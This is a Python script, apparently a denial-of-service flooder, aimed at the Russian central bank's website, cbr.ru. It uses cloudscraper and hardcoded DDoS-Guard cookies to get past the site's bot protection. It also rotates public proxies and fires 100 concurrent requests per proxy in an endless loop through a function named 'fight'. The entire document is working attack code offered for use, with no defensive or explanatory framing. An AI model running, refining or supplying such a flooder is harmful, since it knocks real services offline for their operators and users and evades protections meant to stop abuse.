import cloudscraper
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://cbr.ru/"

cookies = {
    "__ddgid": "faSVIBsQ2mfssQja",
    "__ddgmark	": "juMQYeEu636e0ZBe",
    "__ddg3": "D56OMsxPhgAirtnj",
    "__ddg1": "EwjlQfDgoIH7Caa6aL0d",
    "ASPNET_SessionID": "lqwkephnnx1ho12p33erzryq",
    "__ddg2": "vX40s7nheZG4pCJT",
    "__ddg5": "CfGwWK80CiTYhjkn"
}

scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'mobile': True})

def get_random_working_proxy():
    proxy_url = "https://proxylist.geonode.com/api/proxy-list?limit=10&page=1&sort_by=lastChecked&sort_type=desc"
    data  = scraper.get(proxy_url).json()["data"]
    for proxy in data:
        protocol = proxy['protocols'][0]
        ip = proxy["ip"]
        port = proxy["port"]

        if protocol == "socks4":
            proxies = {
                "http": f"socks4://{ip}:{port}" 
            }
        elif protocol == "socks5":
            proxies = {
                "http": f"socks5://{ip}:{port}"
            }
        elif protocol == "https":
            proxies = {
                "https": f"{ip}:{port}"
            }
        else:
            proxies = {
                "http": f"{ip}:{port}"
            }
        
        try:
            resp_code = scraper.get(url, cookies=cookies, proxies=proxies).status_code
            if resp_code == 200:
                return proxies
        except Exception as ct:
            continue

count = 0
THREADS  = 100


def fight(url, proxy):
    try:
        scraper.get(url, cookies=cookies, proxies=proxy)
    except Exception:
        return "Failure"
    return "Success"


while True:
    proxy = get_random_working_proxy()
    print(f"Proxy found: {proxy}")
    if proxy:
        threads = []
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            for link in [url] * THREADS:
                threads.append(executor.submit(fight, link, proxy))
                
            for task in as_completed(threads):
                print(task.result())

    count += 20
    if count == 1000:
        print(f"Performed {count} requests!")
